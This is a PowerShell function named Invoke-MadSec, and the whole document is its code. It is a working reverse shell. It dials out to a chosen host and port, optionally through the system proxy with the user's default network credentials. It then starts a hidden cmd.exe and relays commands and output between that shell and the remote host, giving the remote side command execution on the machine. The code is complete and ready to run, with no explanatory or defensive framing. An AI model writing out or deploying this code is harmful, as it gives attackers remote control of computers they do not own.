function Invoke-MadSec
{
	[CmdletBinding(DefaultParameterSetName="main")]
		Param (

    	[Parameter(Mandatory = $True)]
    	[ValidateNotNullOrEmpty()]
    	[String]$DestHost = $( Read-Host "Enter destination IP or Hostname: " ),

        [Parameter(Mandatory = $True)]
    	[ValidateNotNullOrEmpty()]        
        [Int]$DestPort = $( Read-Host "Enter destination port: " ),

        [Parameter(Mandatory = $False)]
        [Int]$TimeOut = 60,

        [Parameter(Mandatory = $False, ParameterSetName="AutoProxy")]      
        [Switch]$UseDefaultProxy,

        [Parameter(Mandatory = $False, ParameterSetName="ManualProxy")]      
        [String]$ProxyName,

        [Parameter(Mandatory = $False, ParameterSetName="ManualProxy")]
        [Int]$ProxyPort = 8080
    )

    if ($UseDefaultProxy -or $ProxyName) {
        $DestUri = "http://" + $DestHost + ":" + $DestPort
        $UseProxy = $True
    }

    if ($ProxyName) {
        $Proxy = New-Object System.Net.WebProxy("http://" + $ProxyName + ":" + $ProxyPort)
        Write-Verbose "Using proxy [$ProxyName`:$ProxyPort]"
    }
    elseif ($UseDefaultProxy) {
        $Proxy = [System.Net.WebRequest]::DefaultWebProxy
        $ProxyName = $Proxy.GetProxy($DestUri).Host
        $ProxyPort = $Proxy.GetProxy($DestUri).Port
        if ($ProxyName -eq $DestHost) {
            $UseProxy = $False
            Write-Verbose "System's default proxy is not set, not using it"
        }
        else {
            Write-Verbose "Using system's default proxy [$ProxyName`:$ProxyPort]"
        }       
    }    

    if ($UseProxy) {
        $Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
        $DestHostWebRequest = [System.Net.HttpWebRequest]::Create("http://" + $DestHost + ":" + $DestPort) 
        $DestHostWebRequest.Method = "CONNECT"
        $DestHostWebRequest.Proxy = $Proxy
        $ConnectionTask = $DestHostWebRequest.GetResponseAsync()
        Write-Verbose "[DEBUG] Connecting to [$DestHost`:$DestPort] through proxy [$ProxyName`:$ProxyPort]"
    }
    else {
        $DestHostSocket = New-Object System.Net.Sockets.TcpClient
        $ConnectionTask = $DestHostSocket.ConnectAsync($DestHost,$DestPort)
        Write-Verbose "[DEBUG] Connecting to [$DestHost`:$DestPort]"
    }

    $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    while ($True)
    {
        # Capture keyboard interrupt from user
        if ($Host.UI.RawUI.KeyAvailable)
        {
            if(@(17,27) -contains ($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").VirtualKeyCode))
            {
                Write-Verbose "[DEBUG] Interrupting connection setup"
                if ($UseProxy) { $DestHostWebRequest.Abort() }
                else { $DestHostSocket.Close() }               
                $Stopwatch.Stop()
                return
            }
        }

        if ($Stopwatch.Elapsed.TotalSeconds -gt $Timeout)
        {
            Write-Verbose "[ERROR] Connection timeout reached"
            if ($UseProxy) { $DestHostWebRequest.Abort() }
            else { $DestHostSocket.Close() }  
            $Stopwatch.Stop()
            return
        }

        if ($ConnectionTask.IsCompleted)
        {
            try
            {
                if ($UseProxy) {
                    $ResponseStream = ([System.Net.HttpWebResponse]$ConnectionTask.Result).GetResponseStream()

                    $BindingFlags= [Reflection.BindingFlags] "NonPublic,Instance"
                    $rsType = $ResponseStream.GetType()
                    $connectionProperty = $rsType.GetProperty("Connection", $BindingFlags)
                    $connection = $connectionProperty.GetValue($ResponseStream, $null)
                    $connectionType = $connection.GetType()
                    $networkStreamProperty = $connectionType.GetProperty("NetworkStream", $BindingFlags)
                    $DestHostStream = $networkStreamProperty.GetValue($connection, $null)
                    $BufferSize = 65536
                    Write-Verbose ("[DEBUG]  Connection to [$DestHost`:$DestPort] through proxy [$ProxyName`:$ProxyPort] succeeded")
                }
                else {
                    $DestHostStream = $DestHostSocket.GetStream()
                    $BufferSize = $DestHostSocket.ReceiveBufferSize
                    Write-Verbose ("[DEBUG]  Connection to [$DestHost`:$DestPort] succeeded")
                }
                
                
            }
            catch {
                Write-Verbose($_.Exception.Message)
                if ($UseProxy) { $DestHostWebRequest.Abort() }
                else { $DestHostSocket.Close() }  
                $Stopwatch.Stop()
                Write-Verbose ("[ERROR]  Connection to [$DestHost`:$DestPort] could NOT be established")
                return
            }
            break
        }
    }
        
    $Stopwatch.Stop()
    $Global:Loop = $True
    
    $DestHostBuffer = New-Object System.Byte[] $BufferSize
    $DestHostReadTask = $DestHostStream.ReadAsync($DestHostBuffer, 0, $BufferSize)
    $AsciiEncoding = New-Object System.Text.AsciiEncoding

    $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo
    $ProcessStartInfo.FileName = "cmd.exe"
    $ProcessStartInfo.Arguments = "/q"
    $ProcessStartInfo.UseShellExecute = $False
    $ProcessStartInfo.RedirectStandardInput = $True
    $ProcessStartInfo.RedirectStandardOutput = $True
    $ProcessStartInfo.RedirectStandardError = $True
    $ProcessStartInfo.CreateNoWindow = $True
    $Process = [System.Diagnostics.Process]::Start($ProcessStartInfo)
    $Process.EnableRaisingEvents = $True
    Register-ObjectEvent -InputObject $Process -EventName "Exited" -Action { $Global:Loop = $False } | Out-Null
    $Process.Start() | Out-Null

    $StdOutBuffer = New-Object System.Byte[] 65536
    $StdErrBuffer = New-Object System.Byte[] 65536

    $StdOutReadTask = $Process.StandardOutput.BaseStream.ReadAsync($StdOutBuffer, 0, 65536)
    $StdErrReadTask= $Process.StandardError.BaseStream.ReadAsync($StdErrBuffer, 0, 65536)       

    try
    {
        while($Global:Loop)
        {
            try
            {
                [byte[]]$Data = @()

                if($StdOutReadTask.IsCompleted)
                {
                    if ([int]$StdOutReadTask.Result -ne 0) {
                        $Data += $StdOutBuffer[0..([int]$StdOutReadTask.Result - 1)]
                        $StdOutReadTask = $Process.StandardOutput.BaseStream.ReadAsync($StdOutBuffer, 0, 65536)
                    }                     
                }

                if($StdErrReadTask.IsCompleted)
                {
                    if([int]$StdErrReadTask.Result -ne 0) {
                        $Data += $StdErrBuffer[0..([int]$StdErrReadTask.Result - 1)]
                        $StdErrReadTask= $Process.StandardError.BaseStream.ReadAsync($StdErrBuffer, 0, 65536)
                    }
                }

                if ($Data -ne $null) {
                    $DestHostStream.Write($Data, 0, $Data.Length)
                }
            }
            catch
            {
                Write-Verbose "[ERROR] Failed to redirect data from Process StdOut/StdErr to Destination Host"
                break
            }
            
            try
            {
                $Data = $null
                if($DestHostReadTask.IsCompleted) {
                    if([int]$DestHostReadTask.Result -ne 0) {
                        $Data = $DestHostBuffer[0..([int][int]$DestHostReadTask.Result - 1)]
                        $DestHostReadTask = $DestHostStream.ReadAsync($DestHostBuffer, 0, $BufferSize)
                    }
                }

                if ($Data -ne $null) {
                    $Process.StandardInput.WriteLine($AsciiEncoding.GetString($Data).TrimEnd("`r").TrimEnd("`n"))
                }
            }
            catch
            {
                Write-Verbose "[ERROR] Failed to redirect data from Destination Host to Process StdIn"
                break
            }
        } 
    }  
    finally
    {
        Write-Verbose "[DEBUG] Closing..."
        try { $Process | Stop-Process }
        catch { Write-Verbose "[ERROR] Failed to stop child process" }
        try {
            $DestHostStream.Close()
            if ($UseProxy) { $DestHostWebRequest.Abort() }
            else { $DestHostSocket.Close() }
        }
        catch { Write-Verbose "[ERROR] Failed to close socket to destination host" }
    }
}